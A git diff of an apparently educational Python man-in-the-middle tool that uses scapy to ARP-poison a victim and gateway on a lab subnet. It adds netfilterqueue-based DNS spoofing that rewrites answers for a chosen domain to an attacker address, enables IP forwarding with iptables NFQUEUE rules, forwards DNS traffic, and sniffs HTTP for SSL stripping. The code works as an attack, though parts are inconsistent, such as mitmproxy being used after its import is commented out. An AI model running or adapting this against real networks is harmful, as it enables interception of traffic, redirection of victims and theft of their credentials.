@@ -2,13 +2,29 @@ import sys, os, argparse
 from util import bcolors, clear, parse_ip_input, validate_domain
 import random
 from scapy.all import *
-from scapy.all import sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR, ARP, getmacbyip, send, sniff, TCP, Raw
+from scapy.all import (
+    sendp,
+    Ether,
+    IP,
+    UDP,
+    DNS,
+    DNSQR,
+    DNSRR,
+    ARP,
+    getmacbyip,
+    send,
+    sniff,
+    TCP,
+    Raw,
+)
 import time
 import threading
 import re
 import urllib
 from functools import partial
-from mitmproxy import controller, proxy, options
+import netfilterqueue
+
+# from mitmproxy import controller, proxy, options
 
 
 # The name of the network interface to use for sniffing and sending packets
@@ -113,11 +129,17 @@ def ARPposioning():
 def DNSpoisoning():
     dns_ip = ""
     dns_domain = ""
+    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
+    # Set up iptables rule to trap outgoing packets in a queue
+    print(1)
+    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+    print(2)
 
     # DNS poisoning requires impersonating the router
 
     # Ask for a domain until a valid one is provided
     while not dns_domain:
+        global dns_domain_input
         dns_domain_input = input("Enter the domain name to spoof: ")
         dns_domain_valid = validate_domain(dns_domain_input)
 
@@ -134,12 +156,10 @@ def DNSpoisoning():
     ipGate = raw_input("Enter the IP of the Gateway (probably 10.0.2.1)")
     spoof(ipGate, ipVictim)
     spoof(ipVictim, ipGate)
-    RUNINGTHREAD = True
-    x = threading.Thread(
-        target=sniffing, args=(dns_domain, ipVictim, ipGate, RUNINGTHREAD)
-    )
-    x.daemon = True
-    x.start()
+
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
 
     # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
     # The data below is assumed from that ARP poisoning attack
@@ -154,6 +174,23 @@ def DNSpoisoning():
     #         ip=dns_ip,
     #     )
     # )
+
+
+def process_packet(packet):
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        qname = scapy_packet[DNSQR].qname
+        if dns_domain_input in qname.decode():
+            print("[+] Spoofing target")
+            answer = DNSRR(rrname=qname, rdata="192.168.56.102")
+            scapy_packet[DNS].an = answer
+            scapy_packet[DNS].ancount = 1
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[UDP].len
+            del scapy_packet[UDP].chksum
+            packet.set_payload(bytes(scapy_packet))
+    packet.accept()
 
 
 def sniffing(dns_domain, ipVictim, ipGate, RUNINGTHREAD):
@@ -215,13 +252,21 @@ def dns_forwarding():
     """
     Function for sniffing DNS requests and responses and calling the callback.
     """
-    print('Now sniffing for DNS requests and responses...')
+    print("Now sniffing for DNS requests and responses...")
 
-    ip_gateway = '10.0.2.1'
-    mac_gateway = '52:54:00:12:35:00'
+    ip_gateway = "10.0.2.1"
+    mac_gateway = "52:54:00:12:35:00"
 
     # Sniff for DNS requests and responses and pass ip_gateway
-    sniff(filter="udp port 53", prn=partial(dns_forwarding_callback, ip_gateway=ip_gateway, mac_gateway=mac_gateway), store=0, iface=net_interface, count=1)
+    sniff(
+        filter="udp port 53",
+        prn=partial(
+            dns_forwarding_callback, ip_gateway=ip_gateway, mac_gateway=mac_gateway
+        ),
+        store=0,
+        iface=net_interface,
+        count=1,
+    )
 
 
 def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
@@ -229,32 +274,46 @@ def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
     Callback function in DNS forwarding sniff, forwarding DNS requests to the gateway and DNS responses
     to the victim.
     """
-    ip_victim = '10.0.2.4'
-    ip_attacker = '10.0.2.5'
-    mac_victim = '08:00:27:09:75:00'
-    mac_attacker = '08:00:27:0b:33:f8'
-    print('Sniffed a DNS packet. IP/MAC gateway: {ip_gateway}/{mac_gateway}'.format(ip_gateway=ip_gateway, mac_gateway=mac_gateway))
+    ip_victim = "10.0.2.4"
+    ip_attacker = "10.0.2.5"
+    mac_victim = "08:00:27:09:75:00"
+    mac_attacker = "08:00:27:0b:33:f8"
+    print(
+        "Sniffed a DNS packet. IP/MAC gateway: {ip_gateway}/{mac_gateway}".format(
+            ip_gateway=ip_gateway, mac_gateway=mac_gateway
+        )
+    )
 
-    is_dns_request = packet.haslayer(IP) and packet[IP].src == '10.0.2.4' and packet.haslayer(DNS) and packet[DNS].qr == 0
-    is_dns_response = packet.haslayer(IP) and packet[IP].src == '10.0.2.1' and packet.haslayer(DNS) and packet[DNS].qr == 1
+    is_dns_request = (
+        packet.haslayer(IP)
+        and packet[IP].src == "10.0.2.4"
+        and packet.haslayer(DNS)
+        and packet[DNS].qr == 0
+    )
+    is_dns_response = (
+        packet.haslayer(IP)
+        and packet[IP].src == "10.0.2.1"
+        and packet.haslayer(DNS)
+        and packet[DNS].qr == 1
+    )
 
     # Forward DNS requests to the gateway. Source should be the attacker, destination should be the gateway
     if is_dns_request:
-        print('Sniffed DNS packet is a DNS request')
+        print("Sniffed DNS packet is a DNS request")
         eth = Ether(src=mac_attacker, dst=mac_gateway)
         ip = IP(src=ip_attacker, dst=ip_gateway)
         udp = UDP(sport=53, dport=53)
         dns = packet[DNS]
-        
+
         dns_request = eth / ip / udp / dns
-    
+
         print(dns_request.summary())
-        
+
         sendp(dns_request, iface=net_interface)
 
     # Forward DNS responses to the victim
     if is_dns_response:
-        print('Sniffed DNS packet is a DNS response')
+        print("Sniffed DNS packet is a DNS response")
         eth = Ether(src=mac_gateway, dst=mac_victim)
         ip = IP(src=ip_gateway, dst=ip_victim)
         udp = UDP(sport=53, dport=53)
@@ -263,7 +322,7 @@ def dns_forwarding_callback(packet, ip_gateway, mac_gateway):
         dns_response = eth / ip / udp / dns
 
         sendp(dns_response, iface=net_interface)
-    
+
 
 def SSLstripping():
     """
@@ -302,28 +361,35 @@ def SSLstripping():
     def request(packet):
         if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
             print(packet[TCP].payload)
-        
+
     def response(packet):
         if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
             print(packet[TCP].payload)
-    
+
     # Sniff for HTTP requests in a new thread
-    ssl_strip_thread = threading.Thread(target=ssl_strip_sniffing, args=(request, response))
+    ssl_strip_thread = threading.Thread(
+        target=ssl_strip_sniffing, args=(request, response)
+    )
     ssl_strip_thread.daemon = True
     ssl_strip_thread.start()
 
-    print("\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
-        cyan=bcolors.OKCYAN,
-        attack=ATTACKS["c"],
-        endc=bcolors.ENDC,
-    ))
+    print(
+        "\n{cyan}{attack}{endc} has been executed (you're now a MitM)\n\n".format(
+            cyan=bcolors.OKCYAN,
+            attack=ATTACKS["c"],
+            endc=bcolors.ENDC,
+        )
+    )
+
 
 def ssl_strip_sniffing(request, response):
     sniff(filter="tcp port 80", prn=request, store=0, iface=net_interface, count=1)
 
-class RequestLogger():
+
+class RequestLogger:
     def request(self, flow):
         print(flow.request)
+
 
 def run_proxy(host, port):
     # Start an MITM proxy server + master in Python 2.7 (mitmproxy version 0.18.2)
@@ -333,7 +399,7 @@ def run_proxy(host, port):
     c = proxy.config.ProxyConfig(opts)
     s = proxy.server.ProxyServer(config=c)
     m = controller.Master(opts, s)
-    
+
     try:
         m.run()
     except KeyboardInterrupt:
@@ -341,8 +407,6 @@ def run_proxy(host, port):
 
     # Set of SSL/TLS capable hosts
     # secure_hosts = set()
-
-     
 
 
 def scan_ip(network, iface):
@@ -426,7 +490,9 @@ def main():
         if choice == "e":
             # Remove potential IP tables redirect
             try:
-                os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080")
+                os.system(
+                    "iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080"
+                )
             except:
                 pass
             break
